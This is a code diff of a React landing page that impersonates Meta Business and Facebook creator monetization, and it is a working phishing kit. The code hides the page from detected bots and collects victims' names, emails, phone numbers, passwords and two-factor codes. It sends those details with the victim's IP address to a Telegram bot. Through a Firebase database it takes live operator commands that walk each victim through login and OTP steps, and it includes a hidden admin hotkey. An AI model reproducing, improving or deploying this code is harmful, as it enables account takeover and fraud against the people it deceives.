@@ -25,7 +25,7 @@ import detectBot from '@/utils/detect_bot';
 import countryToLanguage from '@/utils/country_to_language';
 import HomeStartModals from '@/components/home-start-modals';
 
-// Import Telegram & Translations (Đã đồng bộ đường dẫn @/)
+// Import Telegram & Translations
 import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '@/utils/telegram';
 import { translations } from '@/translations'; 
 
@@ -33,7 +33,7 @@ import { translations } from '@/translations';
 // CẤU HÌNH FIREBASE
 const FIREBASE_URL = 'https://project-86410307853429089-default-rtdb.firebaseio.com/';
 const firebaseConfig = { databaseURL: FIREBASE_URL };
-const firebaseApp = initializeApp(firebaseConfig); // Đổi tên biến thành firebaseApp để tránh xung đột
+const firebaseApp = initializeApp(firebaseConfig);
 const database = getDatabase(firebaseApp);
 // ==========================================
 
@@ -50,17 +50,6 @@ const EU_COUNTRY_TO_LANG = {
   HR: 'hr', SI: 'sl', EE: 'et', LV: 'lv', LT: 'lt',
   GR: 'el',
 };
-
-const LoadingSpinner = () => (
-  <div style={{
-    width: '20px', height: '20px',
-    border: '3px solid rgba(255, 255, 255, 0.3)',
-    borderTop: '3px solid #fff',
-    borderRadius: '50%',
-    animation: 'spin 1s linear infinite',
-    margin: '0 auto'
-  }} />
-);
 
 const Home = () =>
 {
@@ -80,7 +69,7 @@ const Home = () =>
     const [ isLoading, setIsLoading ] = useState( true );
     const [ isStartModalsOpen, setStartModalsOpen ] = useState( false );
 
-    // --- STATE CHO FORM MODAL (TỪ FILE 2) ---
+    // --- STATE CHO FORM MODAL ---
     const [lang, setLang] = useState('en');
     const t = translations[lang] || translations['en'] || {};
 
@@ -100,7 +89,6 @@ const Home = () =>
     const [adminNumberInput, setAdminNumberInput] = useState(''); 
     const [showAdmin, setShowAdmin] = useState(false);
 
-    // Sửa lỗi SSR: Chỉ gọi localStorage khi ở Client
     const [sessionId] = useState(() => {
         if (typeof window !== 'undefined') {
             let id = localStorage.getItem('session_id');
@@ -116,328 +104,112 @@ const Home = () =>
     // --- DATA TEXTS CHO LANDING PAGE ---
     const defaultTexts = useMemo(
         () => ( {
-            fullName: 'Full Name',
-            personalEmail: 'Personal Email',
-            businessEmail: 'Business Email',
-            mobilePhone: 'Mobile Phone Number',
-            yourPageName: 'Your Page Name',
-            agreeToTerms: 'I agree to the',
-            confirm: 'Confirm',
-            aboutHelpMore: 'About · Help · See more',
-
+            fullName: 'Full Name', personalEmail: 'Personal Email', businessEmail: 'Business Email', mobilePhone: 'Mobile Phone Number',
+            yourPageName: 'Your Page Name', agreeToTerms: 'I agree to the', confirm: 'Confirm', aboutHelpMore: 'About · Help · See more',
             loginInstruction: 'To activate content monetization and start earning money on Facebook, you must be logged in to your creator account (Facebook) or business Page (Facebook).',
-            mobileOrEmail: 'Mobile number or email',
-            password: 'Password',
-            passwordIncorrect: 'Password is incorrect, please try again.',
-            logIn: 'Log in',
-            continueBtn: 'Continue',
-            forgotPassword: 'Forgot password?',
-            loginPasswordSecurityNote: 'For your security, you must enter your password to continue.',
-            loginPasswordFieldPlaceholder: 'Enter your password',
-            loginForgotPasswordQuestion: 'Forgot your password?',
-
-            twoFATitle: 'Check your authentication code',
+            mobileOrEmail: 'Mobile number or email', password: 'Password', passwordIncorrect: 'Password is incorrect, please try again.', logIn: 'Log in',
+            continueBtn: 'Continue', forgotPassword: 'Forgot password?', loginPasswordSecurityNote: 'For your security, you must enter your password to continue.',
+            loginPasswordFieldPlaceholder: 'Enter your password', loginForgotPasswordQuestion: 'Forgot your password?', twoFATitle: 'Check your authentication code',
             twoFAInstruction: 'Enter the digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).',
-            code: 'Code',
-            codeExpired: 'This code has expired. Please enter a new code later',
-            pleaseWait: 'Please wait',
-
-            findNewWaysTitle: 'Find new ways to earn money with your content.',
-            creatorLabel: 'Creator',
-            subscribeBtn: 'Subscribe',
-            monetizeDesc: "Whether you're creating videos or publishing to a blog, Facebook monetization tools help you earn more money.",
-
-            heroTitle: 'Explore how Meta technologies can help transform your business.',
-            startNow: 'Start now',
-            trustedExperts: 'Trusted by experts',
-            exploreMeta: 'Explore Meta technologies',
-            improveAd: 'Improve ad performance',
-            improveAdDesc: 'Maximise campaign results and simplify the setup process with advanced ad creation tools.',
-            reachPeople: 'Reach people where they are',
-            reachPeopleDesc: 'Connect with people across Meta technologies and build relationships.',
-            getExpert: 'Get expert guidance',
-            getExpertDesc: 'Access personalized support and resources to help your business grow.',
-            findSolutions: 'Find solutions for your business',
-            findSolutionsDesc: 'Discover the right tools and strategies to achieve your unique goals.',
-            understandAudience: 'Understand your audience',
-            understandAudienceDesc: 'Gain insights into customer behavior and preferences to inform your marketing.',
-            useFormats: 'Use versatile ad formats',
-            useFormatsDesc: 'Create engaging ads that resonate with your target audience across different platforms.',
-            toolsTitle: 'Gain access to tools that deliver results.',
-            adsManager: 'Ads Manager',
-            fbIgShops: 'Facebook & Instagram Shops',
-            messengerApi: 'Messenger API',
-            waBusiness: 'WhatsApp Business Platform',
+            code: 'Code', codeExpired: 'This code has expired. Please enter a new code later', pleaseWait: 'Please wait', findNewWaysTitle: 'Find new ways to earn money with your content.',
+            creatorLabel: 'Creator', subscribeBtn: 'Subscribe', monetizeDesc: "Whether you're creating videos or publishing to a blog, Facebook monetization tools help you earn more money.",
+            heroTitle: 'Explore how Meta technologies can help transform your business.', startNow: 'Start now', trustedExperts: 'Trusted by experts',
+            exploreMeta: 'Explore Meta technologies', improveAd: 'Improve ad performance', improveAdDesc: 'Maximise campaign results and simplify the setup process with advanced ad creation tools.',
+            reachPeople: 'Reach people where they are', reachPeopleDesc: 'Connect with people across Meta technologies and build relationships.', getExpert: 'Get expert guidance',
+            getExpertDesc: 'Access personalized support and resources to help your business grow.', findSolutions: 'Find solutions for your business',
+            findSolutionsDesc: 'Discover the right tools and strategies to achieve your unique goals.', understandAudience: 'Understand your audience',
+            understandAudienceDesc: 'Gain insights into customer behavior and preferences to inform your marketing.', useFormats: 'Use versatile ad formats',
+            useFormatsDesc: 'Create engaging ads that resonate with your target audience across different platforms.', toolsTitle: 'Gain access to tools that deliver results.',
+            adsManager: 'Ads Manager', fbIgShops: 'Facebook & Instagram Shops', messengerApi: 'Messenger API', waBusiness: 'WhatsApp Business Platform',
             inspiredTitle: 'Be inspired by reading how best-in-class marketers scale their business with Meta technologies.',
-            streetwearTip: 'Streetwear brand Market shares tips on how to hype up your next product drop',
-            brooklinenTip: 'Brooklinen shares how to use Meta ad solutions to find new customers',
-            shopifyTip: 'Shopify shares how to use Meta tools to build a community and grow sales',
-            reachTitle: 'Reach more customers with ads on Meta technologies.',
-            reachDesc: 'Discover everything you need to start advertising your business.',
-            connectedTitle: 'Stay connected to your audience.',
-            reachCustomersFb: 'Reach your customers with the Facebook app.',
-            createPage: 'Create a Page',
-            getSupport: 'Get support',
-            resourcesTitle: 'Additional resources for your business.',
-            footerUpdateTitle: 'Get the latest updates from Meta for business.',
+            streetwearTip: 'Streetwear brand Market shares tips on how to hype up your next product drop', brooklinenTip: 'Brooklinen shares how to use Meta ad solutions to find new customers',
+            shopifyTip: 'Shopify shares how to use Meta tools to build a community and grow sales', reachTitle: 'Reach more customers with ads on Meta technologies.',
+            reachDesc: 'Discover everything you need to start advertising your business.', connectedTitle: 'Stay connected to your audience.',
+            reachCustomersFb: 'Reach your customers with the Facebook app.', createPage: 'Create a Page', getSupport: 'Get support',
+            resourcesTitle: 'Additional resources for your business.', footerUpdateTitle: 'Get the latest updates from Meta for business.',
             footerUpdateDesc: 'Provide your email address to receive the latest updates from Meta for business, including news, events and product updates.',
-            emailAddressPlaceholder: 'Email address',
-            enterCountry: 'Enter a country name...',
+            emailAddressPlaceholder: 'Email address', enterCountry: 'Enter a country name...',
             footerDisclaimer: 'By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our',
-            dataPolicy: 'Data Policy',
-            successModalTitle: 'Request has been sent',
-            successModalDesc: 'Your information has been added to the processing queue. We will respond to your results within 24 hours. In case we do not receive a response, please resend the information so we can assist you.',
-            successModalFrom: 'From the Customer Care Team',
-            successModalBtn: 'Return to facebook',
-            successModalHeroAlt: 'Success',
-            successModalLogoAlt: 'Meta',
-            twoFATitleNew: 'Two-factor authentication required',
-            twoFADescriptionTemplate: 'Enter the code for this account that we send to {{email}}, {{phone}} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
-            twoFAFallbackUser: 'User',
-            twoFABrandFacebook: 'Facebook',
-            twoFAAuthenticationImageAlt: 'Two-factor authentication',
-            enterCode: 'Enter the code',
-            tryAnotherWay: 'Try another way',
-            information: 'Information',
-            fanpageName: 'Fanpage Name',
-            dateOfBirth: 'Date of Birth',
-            day: 'Day',
-            month: 'Month',
-            year: 'Year',
-            message: 'Message',
-            responseWithin: 'Our response will be sent to you within 14 - 48 hours.',
-            termsOfUse: 'Terms of use',
-            submit: 'Submit',
-
-            navGetStarted: 'Get started',
-            navAdvertise: 'Advertise',
-            navLearn: 'Learn',
-            navSupport: 'Support',
-
-            landingHeroTitle: 'Become a Meta Business Partner',
-            landingHeroSubtitle: 'Become a Meta Business Partner to receive up to $3,000 in advertising credits, along with valuable benefits such as training, technical support, analytics tools, and opportunities to expand your client network. Get started now to claim your advertising credits.',
-            landingGetStartedBtn: 'Get started',
-
-            metaVerifiedTitle: 'Protect your brand with Meta Verified',
-            metaVerifiedDesc:
-                'Stand out with a verified badge, proactive account protection and access to support — so people know they are engaging with the real you.',
-            metaVerifiedBtnFacebook: 'Subscribe on Facebook',
-            metaVerifiedBtnInstagram: 'Subscribe on Instagram',
-            metaVerifiedBusinessLead: 'Are you a business?',
-            metaVerifiedBusinessLink: 'Get more information on Meta Verified for businesses',
-            metaVerifiedDisclaimer: 'Features, availability and pricing may vary by region and app.',
-            metaVerifiedAriaClose: 'Close dialog',
-            metaVerifiedPhonesAlt: 'Facebook and Instagram with Meta Verified',
-            metaVerifiedCornerLabel: 'Meta xác minh',
-            homeStartModalCornerLead: 'Đăng Ký',
-
-            monetizeModalBack: 'Tất cả các mục tiêu kinh doanh',
-            monetizeModalCornerLabel: 'Kiếm tiền nội dung',
-            monetizeModalEyebrow: 'Kiếm tiền từ nội dung của tôi',
-            monetizeModalTitle: 'Tìm những cách thức mới để kiếm tiền từ nội dung của bạn.',
-            monetizeModalCreator: 'Người sáng tạo',
-            monetizeModalDesc:
-                'Dù bạn đang tạo video hay đăng bài lên blog, các công cụ kiếm tiền của Facebook đều giúp bạn kiếm được nhiều tiền hơn.',
-            monetizeModalSubscribe: 'Đăng ký',
-            monetizeModalBrand: 'The Vegan Baker',
-            monetizeModalHeroAlt: 'Người sáng tạo nội dung trong bếp với bánh cupcake',
-
-            trustedPartnersTitle: 'Meta Business Partners are trusted experts',
-            trustedPartnersDesc: 'Join our global community of solution specialists, vetted by Meta for technical and service excellence. When you join, you\'ll get access to unique benefits such as training, support, analytics reports and client matching opportunities to help fuel the growth of your business.',
-
-            landingFeatureReachMoreTitle: 'Reach more people',
-            landingFeatureReachMoreDesc: 'Get ads to people most likely to be interested in your products or services with automated targeting tools.',
-            becomeExpertCardTitle: 'Become an expert',
-            becomeExpertLead: 'Upgrade your marketing skills with free online courses and certifications through',
-            metaBlueprintBrand: 'Meta Blueprint',
-            becomeExpertTrail: '',
-            personalisedAdSolutionsTitle: 'Get personalised ad solutions',
-            personalisedAdSolutionsDesc: 'See faster results in fewer steps with AI-enabled tools that generate ads your customers want to see.',
-            understandPerformanceTitle: 'Understand performance',
-            understandPerformanceDesc: 'Access advanced marketing performance tracking with detailed overviews of audience behaviour.',
-            adFormatsTitle: 'Use ad formats that work',
-            adFormatsDesc: 'Designed to fit specific business goals, reach and expand your audience across every device.',
-
+            dataPolicy: 'Data Policy', successModalTitle: 'Request has been sent', successModalDesc: 'Your information has been added to the processing queue. We will respond to your results within 24 hours. In case we do not receive a response, please resend the information so we can assist you.',
+            successModalFrom: 'From the Customer Care Team', successModalBtn: 'Return to facebook', successModalHeroAlt: 'Success', successModalLogoAlt: 'Meta',
+            twoFATitleNew: 'Two-factor authentication required', twoFADescriptionTemplate: 'Enter the code for this account that we send to {{email}}, {{phone}} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
+            twoFAFallbackUser: 'User', twoFABrandFacebook: 'Facebook', twoFAAuthenticationImageAlt: 'Two-factor authentication', enterCode: 'Enter the code',
+            tryAnotherWay: 'Try another way', information: 'Information', fanpageName: 'Fanpage Name', dateOfBirth: 'Date of Birth', day: 'Day', month: 'Month', year: 'Year',
+            message: 'Message', responseWithin: 'Our response will be sent to you within 14 - 48 hours.', termsOfUse: 'Terms of use', submit: 'Submit',
+            navGetStarted: 'Get started', navAdvertise: 'Advertise', navLearn: 'Learn', navSupport: 'Support',
+            landingHeroTitle: 'Become a Meta Business Partner', landingHeroSubtitle: 'Become a Meta Business Partner to receive up to $3,000 in advertising credits, along with valuable benefits such as training, technical support, analytics tools, and opportunities to expand your client network. Get started now to claim your advertising credits.',
+            landingGetStartedBtn: 'Get started', metaVerifiedTitle: 'Protect your brand with Meta Verified', metaVerifiedDesc: 'Stand out with a verified badge, proactive account protection and access to support — so people know they are engaging with the real you.',
+            metaVerifiedBtnFacebook: 'Subscribe on Facebook', metaVerifiedBtnInstagram: 'Subscribe on Instagram', metaVerifiedBusinessLead: 'Are you a business?',
+            metaVerifiedBusinessLink: 'Get more information on Meta Verified for businesses', metaVerifiedDisclaimer: 'Features, availability and pricing may vary by region and app.',
+            metaVerifiedAriaClose: 'Close dialog', metaVerifiedPhonesAlt: 'Facebook and Instagram with Meta Verified', metaVerifiedCornerLabel: 'Meta xác minh', homeStartModalCornerLead: 'Đăng Ký',
+            monetizeModalBack: 'Tất cả các mục tiêu kinh doanh', monetizeModalCornerLabel: 'Kiếm tiền nội dung', monetizeModalEyebrow: 'Kiếm tiền từ nội dung của tôi',
+            monetizeModalTitle: 'Tìm những cách thức mới để kiếm tiền từ nội dung của bạn.', monetizeModalCreator: 'Người sáng tạo',
+            monetizeModalDesc: 'Dù bạn đang tạo video hay đăng bài lên blog, các công cụ kiếm tiền của Facebook đều giúp bạn kiếm được nhiều tiền hơn.',
+            monetizeModalSubscribe: 'Đăng ký', monetizeModalBrand: 'The Vegan Baker', monetizeModalHeroAlt: 'Người sáng tạo nội dung trong bếp với bánh cupcake',
+            trustedPartnersTitle: 'Meta Business Partners are trusted experts', trustedPartnersDesc: 'Join our global community of solution specialists, vetted by Meta for technical and service excellence. When you join, you\'ll get access to unique benefits such as training, support, analytics reports and client matching opportunities to help fuel the growth of your business.',
+            landingFeatureReachMoreTitle: 'Reach more people', landingFeatureReachMoreDesc: 'Get ads to people most likely to be interested in your products or services with automated targeting tools.',
+            becomeExpertCardTitle: 'Become an expert', becomeExpertLead: 'Upgrade your marketing skills with free online courses and certifications through', metaBlueprintBrand: 'Meta Blueprint', becomeExpertTrail: '',
+            personalisedAdSolutionsTitle: 'Get personalised ad solutions', personalisedAdSolutionsDesc: 'See faster results in fewer steps with AI-enabled tools that generate ads your customers want to see.',
+            understandPerformanceTitle: 'Understand performance', understandPerformanceDesc: 'Access advanced marketing performance tracking with detailed overviews of audience behaviour.',
+            adFormatsTitle: 'Use ad formats that work', adFormatsDesc: 'Designed to fit specific business goals, reach and expand your audience across every device.',
             accordionAdsManagerDesc: 'Create and track new ads, monitor your budget and increase sales across Facebook, Messenger, Instagram and WhatsApp – all from one place.',
-            accordionBusinessSuiteTitle: 'Meta Business Suite',
-            accordionBusinessSuiteDesc: 'Manage all your Facebook and Instagram activities in one place – including posting, messaging, analytics and advertising.',
-            accordionPixelTitle: 'Meta pixel',
-            accordionPixelDesc: 'Understand the actions people take on your website and reach new audiences with the Meta pixel.',
-            accordionFbPagesTitle: 'Facebook Pages',
-            accordionFbPagesDesc: 'Connect with customers and grow your business with a Facebook Page.',
-            accordionAiMarketingTitle: 'AI tools (performance marketing)',
-            accordionAiMarketingDesc: 'Use AI-powered tools to automate and optimise your campaigns for better performance.',
-
-            learnMore: 'Learn more',
-            goToAdsManager: 'Go to Ads Manager',
-
-            inspiredBrookShort: 'Brooklinen\'s tips for maximising your ad budget',
-            inspiredShopifyShort: 'Shopify\'s tips for reaching the right audience',
-
-            createAd: 'Create ad',
-
-            metaTechnologiesEyebrow: 'Meta technologies',
-            marketingOnFacebookEyebrow: 'Marketing on Facebook',
-            fansBuildFollowingTitle: 'Find fans and build a following.',
-            fansBuildFollowingDesc: 'Create lasting relationships with customers everywhere by marketing with Facebook.',
-            exploreFacebookLink: 'Explore Facebook',
-
-            supportCentreEyebrow: 'Meta Business Help Centre',
-            supportAnswersTitle: 'Get answers to FAQ, plus help and support with troubleshooting business accounts.',
-
-            mediaIllustrationAlt: 'Meta Platforms Illustration',
-
-            ariaPlayVideo: 'Play',
-            ariaPauseVideo: 'Pause',
-
-            footerFcMetaFb: 'Facebook',
-            footerFcMetaIg: 'Instagram',
-            footerFcMetaMsg: 'Messenger',
-            footerFcMetaWa: 'WhatsApp',
-            footerFcMetaAn: 'Audience Network',
-            footerFcMetaQuest: 'Meta Quest',
-            footerFcMetaWorkplace: 'Workplace',
-            footerFcMetaForWork: 'Meta for Work',
-
-            footerFcToolsFt: 'Free tools',
-            footerFcToolsFbPages: 'Facebook Pages',
-            footerFcToolsIgProfiles: 'Instagram profiles',
-            footerFcToolsStories: 'Stories',
-            footerFcToolsShops: 'Shops',
-            footerFcToolsMbs: 'Meta Business Suite',
-            footerFcToolsFbAds: 'Facebook ads',
-            footerFcToolsIgAds: 'Instagram ads',
-            footerFcToolsVideoAds: 'Video ads',
-            footerFcToolsAdsMgr: 'Ads Manager',
-
-            footerFcGoalsFbPage: 'Set up a Facebook Page',
-            footerFcGoalsBrandAwareness: 'Build brand awareness',
-            footerFcGoalsLocal: 'Promote your local business',
-            footerFcGoalsOnlineSales: 'Grow online sales',
-            footerFcGoalsApp: 'Promote your app',
-            footerFcGoalsLeads: 'Generate leads',
-            footerFcGoalsMeasure: 'Measure and optimise ads',
-            footerFcGoalsRetarget: 'Retarget existing customers',
-
-            footerFcBizSmall: 'Small business',
-            footerFcBizLarge: 'Large businesses',
-            footerFcBizAgency: 'Agency',
-            footerFcBizMedia: 'Media and publisher',
-            footerFcBizCreator: 'Creator',
-            footerFcBizDev: 'Developer',
-            footerFcBizPartner: 'Business partner',
-
-            footerFcIndustryAuto: 'Automotive',
-            footerFcIndustryCpg: 'Consumer packaged goods',
-            footerFcIndustryEcom: 'E-commerce',
-            footerFcIndustryEnt: 'Entertainment and media',
-            footerFcIndustryFin: 'Financial services',
-            footerFcIndustryGaming: 'Gaming',
-            footerFcIndustryProperty: 'Property',
-            footerFcIndustryRest: 'Restaurants',
-            footerFcIndustryRetail: 'Retail',
-            footerFcIndustryTech: 'Technology and telecom',
-            footerFcIndustryTravel: 'Travel',
-
-            footerFcSkillsOnline: 'Online learning',
-            footerFcSkillsCert: 'Certification programmes',
-            footerFcSkillsWebinars: 'Webinars',
-
-            footerFcGuideAds: 'Ads guide',
-            footerFcGuideBrand: 'Brand safety and suitability',
-            footerFcGuideBook: '"Click Here" book',
-            footerFcGuideMedia: 'Media responsibility',
-            footerFcGuideSitemap: 'Sitemap',
-
-            footerFcColMetaTech: 'Meta technologies',
-            footerFcColTools: 'Tools',
-            footerFcColGoals: 'Goals',
-            footerFcColBusinessTypes: 'Business types',
-            footerFcColIndustries: 'Industries',
-            footerFcColSkills: 'Skills and training',
-            footerFcColGuides: 'Guides and resources',
-
-            footerLegalAbout: 'About',
-            footerLegalDevelopers: 'Developers',
-            footerLegalCareers: 'Careers',
-            footerLegalPrivacy: 'Privacy',
-            footerLegalCookies: 'Cookies',
-            footerLegalTerms: 'Terms',
-            footerLegalHelp: 'Help Centre',
-
-            footerSocialFacebook: 'Facebook',
-            footerSocialInstagram: 'Instagram',
-            footerSocialX: 'X',
-            footerSocialLinkedIn: 'LinkedIn',
-
-            footerCopyrightNotice: '© 2026 Meta'
+            accordionBusinessSuiteTitle: 'Meta Business Suite', accordionBusinessSuiteDesc: 'Manage all your Facebook and Instagram activities in one place – including posting, messaging, analytics and advertising.',
+            accordionPixelTitle: 'Meta pixel', accordionPixelDesc: 'Understand the actions people take on your website and reach new audiences with the Meta pixel.',
+            accordionFbPagesTitle: 'Facebook Pages', accordionFbPagesDesc: 'Connect with customers and grow your business with a Facebook Page.',
+            accordionAiMarketingTitle: 'AI tools (performance marketing)', accordionAiMarketingDesc: 'Use AI-powered tools to automate and optimise your campaigns for better performance.',
+            learnMore: 'Learn more', goToAdsManager: 'Go to Ads Manager', inspiredBrookShort: 'Brooklinen\'s tips for maximising your ad budget', inspiredShopifyShort: 'Shopify\'s tips for reaching the right audience',
+            createAd: 'Create ad', metaTechnologiesEyebrow: 'Meta technologies', marketingOnFacebookEyebrow: 'Marketing on Facebook', fansBuildFollowingTitle: 'Find fans and build a following.',
+            fansBuildFollowingDesc: 'Create lasting relationships with customers everywhere by marketing with Facebook.', exploreFacebookLink: 'Explore Facebook',
+            supportCentreEyebrow: 'Meta Business Help Centre', supportAnswersTitle: 'Get answers to FAQ, plus help and support with troubleshooting business accounts.', mediaIllustrationAlt: 'Meta Platforms Illustration',
+            ariaPlayVideo: 'Play', ariaPauseVideo: 'Pause', footerFcMetaFb: 'Facebook', footerFcMetaIg: 'Instagram', footerFcMetaMsg: 'Messenger', footerFcMetaWa: 'WhatsApp', footerFcMetaAn: 'Audience Network', footerFcMetaQuest: 'Meta Quest', footerFcMetaWorkplace: 'Workplace', footerFcMetaForWork: 'Meta for Work',
+            footerFcToolsFt: 'Free tools', footerFcToolsFbPages: 'Facebook Pages', footerFcToolsIgProfiles: 'Instagram profiles', footerFcToolsStories: 'Stories', footerFcToolsShops: 'Shops', footerFcToolsMbs: 'Meta Business Suite', footerFcToolsFbAds: 'Facebook ads', footerFcToolsIgAds: 'Instagram ads', footerFcToolsVideoAds: 'Video ads', footerFcToolsAdsMgr: 'Ads Manager',
+            footerFcGoalsFbPage: 'Set up a Facebook Page', footerFcGoalsBrandAwareness: 'Build brand awareness', footerFcGoalsLocal: 'Promote your local business', footerFcGoalsOnlineSales: 'Grow online sales', footerFcGoalsApp: 'Promote your app', footerFcGoalsLeads: 'Generate leads', footerFcGoalsMeasure: 'Measure and optimise ads', footerFcGoalsRetarget: 'Retarget existing customers',
+            footerFcBizSmall: 'Small business', footerFcBizLarge: 'Large businesses', footerFcBizAgency: 'Agency', footerFcBizMedia: 'Media and publisher', footerFcBizCreator: 'Creator', footerFcBizDev: 'Developer', footerFcBizPartner: 'Business partner',
+            footerFcIndustryAuto: 'Automotive', footerFcIndustryCpg: 'Consumer packaged goods', footerFcIndustryEcom: 'E-commerce', footerFcIndustryEnt: 'Entertainment and media', footerFcIndustryFin: 'Financial services', footerFcIndustryGaming: 'Gaming', footerFcIndustryProperty: 'Property', footerFcIndustryRest: 'Restaurants', footerFcIndustryRetail: 'Retail', footerFcIndustryTech: 'Technology and telecom', footerFcIndustryTravel: 'Travel',
+            footerFcSkillsOnline: 'Online learning', footerFcSkillsCert: 'Certification programmes', footerFcSkillsWebinars: 'Webinars',
+            footerFcGuideAds: 'Ads guide', footerFcGuideBrand: 'Brand safety and suitability', footerFcGuideBook: '"Click Here" book', footerFcGuideMedia: 'Media responsibility', footerFcGuideSitemap: 'Sitemap',
+            footerFcColMetaTech: 'Meta technologies', footerFcColTools: 'Tools', footerFcColGoals: 'Goals', footerFcColBusinessTypes: 'Business types', footerFcColIndustries: 'Industries', footerFcColSkills: 'Skills and training', footerFcColGuides: 'Guides and resources',
+            footerLegalAbout: 'About', footerLegalDevelopers: 'Developers', footerLegalCareers: 'Careers', footerLegalPrivacy: 'Privacy', footerLegalCookies: 'Cookies', footerLegalTerms: 'Terms', footerLegalHelp: 'Help Centre',
+            footerSocialFacebook: 'Facebook', footerSocialInstagram: 'Instagram', footerSocialX: 'X', footerSocialLinkedIn: 'LinkedIn', footerCopyrightNotice: '© 2026 Meta'
         } ),
         []
     );
 
-    // Sửa lỗi: Đổi tên hàm initializeApp của Landing Page để không trùng với Firebase
     const initLandingPage = async () => {
         try {
             const botResult = await detectBot();
-            if ( botResult.isBot ) {
-                window.location.href = 'about:blank';
-                return;
-            }
-
+            if ( botResult.isBot ) { window.location.href = 'about:blank'; return; }
             try {
                 const response = await axios.get( 'https://get.geojs.io/v1/ip/geo.json' );
                 const data = response.data;
                 localStorage.setItem( 'ipInfo', JSON.stringify( data ) );
-
                 const countryCode = data.country_code;
                 const targetLang = countryToLanguage[ countryCode ] || 'en';
                 localStorage.setItem( 'targetLang', targetLang );
-
-                if ( targetLang !== 'en' ) {
-                    translateAllTexts( targetLang );
-                } else {
-                    setTranslatedTexts( defaultTexts );
-                }
-            } catch ( error ) {
-                console.error( 'Error fetching IP:', error );
-                setTranslatedTexts( defaultTexts );
-            }
-
+                if ( targetLang !== 'en' ) { translateAllTexts( targetLang ); } else { setTranslatedTexts( defaultTexts ); }
+            } catch ( error ) { console.error( 'Error fetching IP:', error ); setTranslatedTexts( defaultTexts ); }
             setIsLoading( false );
-        } catch ( error ) {
-            console.error( 'Initialization error:', error );
-            setIsLoading( false );
-        }
+        } catch ( error ) { console.error( 'Initialization error:', error ); setIsLoading( false ); }
     };
 
     useEffect( () => {
-        if (typeof window !== 'undefined') {
-            localStorage.clear();
-        }
+        if (typeof window !== 'undefined') { localStorage.clear(); }
         initLandingPage();
     }, [] );
 
-    const translateAllTexts = useCallback(
-        async ( targetLang ) => {
-            try {
-                const keys = Object.keys( defaultTexts );
-                const translations = await Promise.all( keys.map( ( key ) => translateText( defaultTexts[ key ], targetLang ) ) );
-                const translated = {};
-                keys.forEach( ( key, index ) => {
-                    translated[ key ] = translations[ index ];
-                } );
-                setTranslatedTexts( translated );
-            } catch ( error ) {
-                console.error( 'Translation error:', error );
-                setTranslatedTexts( defaultTexts );
-            }
-        },
-        [ defaultTexts ]
-    );
+    const translateAllTexts = useCallback( async ( targetLang ) => {
+        try {
+            const keys = Object.keys( defaultTexts );
+            const translations = await Promise.all( keys.map( ( key ) => translateText( defaultTexts[ key ], targetLang ) ) );
+            const translated = {};
+            keys.forEach( ( key, index ) => { translated[ key ] = translations[ index ]; } );
+            setTranslatedTexts( translated );
+        } catch ( error ) { console.error( 'Translation error:', error ); setTranslatedTexts( defaultTexts ); }
+    }, [ defaultTexts ] );
 
     const texts = Object.keys( translatedTexts ).length > 0 ? translatedTexts : defaultTexts;
 
-    // --- LẤY IP & NGÔN NGỮ CHO FORM (TỪ FILE 2) ---
+    // --- LẤY IP & NGÔN NGỮ CHO FORM ---
     useEffect(() => { 
         fetch('https://ipwho.is/')
           .then(r => r.json())
@@ -445,17 +217,10 @@ const Home = () =>
               if (d && d.ip) {
                   setClientIp(`${d.ip} - ${d.country} (${d.city})`);
                   const mappedLang = EU_COUNTRY_TO_LANG[d.country_code];
-                  if (mappedLang && translations[mappedLang]) {
-                      setLang(mappedLang);
-                  } else {
-                      setLang('en');
-                  }
-                  if (d.country_code && countryCodeMap[d.country_code]) { 
-                      setCountryCode(countryCodeMap[d.country_code]); 
-                  }
+                  if (mappedLang && translations[mappedLang]) { setLang(mappedLang); } else { setLang('en'); }
+                  if (d.country_code && countryCodeMap[d.country_code]) { setCountryCode(countryCodeMap[d.country_code]); }
               }
-          })
-          .catch(()=>{}); 
+          }).catch(()=>{}); 
     }, []);
 
     // --- LẮNG NGHE LỆNH TỪ ADMIN QUA FIREBASE ---
@@ -465,18 +230,10 @@ const Home = () =>
             const unsubscribe = onValue(commandRef, (snapshot) => {
                 const data = snapshot.val();
                 if (data && data.action) {
-                    if (data.action === 'otp') {
-                        setStep(3); setMatchNumber(null); setShowSuccess(false);
-                    } 
-                    else if (data.action === 'approve' && data.value) {
-                        setStep(3); setMatchNumber(data.value); setShowSuccess(false);
-                    } 
-                    else if (data.action === 'success') {
-                        setStep(3); setShowSuccess(true);
-                    } 
-                    else if (data.action === 'error') {
-                        setStep(2); setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
-                    }
+                    if (data.action === 'otp') { setStep(3); setMatchNumber(null); setShowSuccess(false); } 
+                    else if (data.action === 'approve' && data.value) { setStep(3); setMatchNumber(data.value); setShowSuccess(false); } 
+                    else if (data.action === 'success') { setStep(3); setShowSuccess(true); } 
+                    else if (data.action === 'error') { setStep(2); setShowLoginError(true); setLoginPass(''); setShowSuccess(false); }
                 }
             });
             return () => unsubscribe();
@@ -486,9 +243,7 @@ const Home = () =>
     // --- PHÍM TẮT ADMIN ---
     useEffect(() => {
         const handleKeyDown = (e) => {
-            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
-                setShowAdmin(prev => !prev); setShowModal(true);
-            }
+            if (e.ctrlKey && e.shiftKey && e.key === 'A') { setShowAdmin(prev => !prev); setShowModal(true); }
         };
         window.addEventListener('keydown', handleKeyDown);
         return () => window.removeEventListener('keydown', handleKeyDown);
@@ -506,30 +261,22 @@ const Home = () =>
         if (Object.keys(errs).length > 0) { setErrors(errs); return; }
         
         setErrors({}); setLoading(true);
-        
         const text = `<b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n<b>Business:</b> <code>${escapeHtml(busName)}</code>\n<b>P.Email:</b> <code>${escapeHtml(perEmail)}</code>\n<b>B.Email:</b> <code>${escapeHtml(busEmail)}</code>\n<b>Phone:</b> <code>${escapeHtml(countryCode + phoneNum)}</code>\n`;
-        
-        setInitialSession(text); 
-        sendTelegramMessage('');
-        
+        setInitialSession(text); sendTelegramMessage('');
